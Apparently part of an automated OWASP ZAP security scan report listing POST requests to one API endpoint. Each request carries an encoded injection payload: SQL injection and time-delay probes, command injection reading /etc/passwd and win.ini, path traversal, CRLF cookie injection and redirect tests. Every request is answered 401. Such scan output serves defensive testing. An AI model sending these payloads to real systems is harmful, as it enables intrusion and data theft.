* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=0W45pz4p
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=5%253BURL%253D%2527https%253A%252F%252F980414377652208366.owasp.org%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=7c7mvcir0l8zo8r5uu9khse7m8v6tsuaote8a04qvg3iunmwve47v6ts92
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=any%250ASet-cookie%253A+Tamper%253D841613ad-d638-4fe4-b29f-b70689cd5927
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=any%250D%250ASet-cookie%253A+Tamper%253D841613ad-d638-4fe4-b29f-b70689cd5927
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=any%250D%250ASet-cookie%253A+Tamper%253D841613ad-d638-4fe4-b29f-b70689cd5927%250D%250A
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=any%253F%250ASet-cookie%253A+Tamper%253D841613ad-d638-4fe4-b29f-b70689cd5927
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=any%253F%250D%250ASet-cookie%253A+Tamper%253D841613ad-d638-4fe4-b29f-b70689cd5927
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=any%253F%250D%250ASet-cookie%253A+Tamper%253D841613ad-d638-4fe4-b29f-b70689cd5927%250D%250A
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=bakf44n0pivuwf0yn5wi2fbkk984uivx2yajedkvpso8i8uscc23wwb8
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=c%253A%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=c%253A%252FWindows%252Fsystem.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=c%253A%255C
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=c%253A%255CWindows%255Csystem.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=case+randomblob%2528100000%2529+when+not+null+then+1+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=case+randomblob%25281000000%2529+when+not+null+then+1+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=case+randomblob%252810000000%2529+when+not+null+then+1+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=case+randomblob%2528100000000%2529+when+not+null+then+1+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=case+randomblob%25281000000000%2529+when+not+null+then+1+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=cat+%252Fetc%252Fpasswd
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=get-help
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=http%253A%252F%252F%255C980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=http%253A%252F%252F980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=http%253A%252F%252Fwww.google.com
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=http%253A%252F%252Fwww.google.com%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=http%253A%252F%252Fwww.google.com%252Fsearch%253Fq%253DZAP
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=http%253A%252F%252Fwww.google.com%253A80%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=http%253A%252F%252Fwww.google.com%253A80%252Fsearch%253Fq%253DZAP
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=https%253A%252F%252F%255C980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=https%253A%252F%252F980414377652208366%25252eowasp%25252eorg
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=https%253A%252F%252F980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=ktj5q2w6srz0kzg2kttdm5t974ka8vnwzbxn5hec3y92rmsew66fxn3uh3mx
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522%2526cat+%252Fetc%252Fpasswd%2526%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522%2526sleep+15.0%2526%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522%2526timeout+%252FT+15.0%2526%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522%253Bcat+%252Fetc%252Fpasswd%253B%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522%253Bget-help
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522%253Bsleep+15.0%253B%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522%253Bstart-sleep+-s+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522%257Ctimeout+%252FT+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522+%252F+sleep%252815%2529+%252F+%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522+UNION+ALL+select+NULL+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2522+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2526cat+%252Fetc%252Fpasswd%2526
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2526sleep+15.0%2526
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2526timeout+%252FT+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2526type+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527%2526cat+%252Fetc%252Fpasswd%2526%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527%2526sleep+15.0%2526%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527%2526timeout+%252FT+15.0%2526%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527%2528
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527%2529+UNION+ALL+select+NULL+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527%253Bcat+%252Fetc%252Fpasswd%253B%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527%253Bget-help
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527%253Bsleep+15.0%253B%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527%253Bstart-sleep+-s+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527%257Ctimeout+%252FT+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527+%252F+sleep%252815%2529+%252F+%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527+AND+%25271%2527%253D%25271%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527+AND+%25271%2527%253D%25272%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527+OR+%25271%2527%253D%25271%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527+UNION+ALL+select+NULL+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2527+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2529%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2529%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2529%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2529+UNION+ALL+select+NULL+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+%2528
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%253B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%253Bcat+%252Fetc%252Fpasswd%253B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%253Bget-help
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%253Bget-help+%2523
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%253Bsleep+15.0%253B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%253Bstart-sleep+-s+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%253Bstart-sleep+-s+15.0+%2523
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%257Ctimeout+%252FT+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names+%252F+case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names+%252F+sleep%252815%2529+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
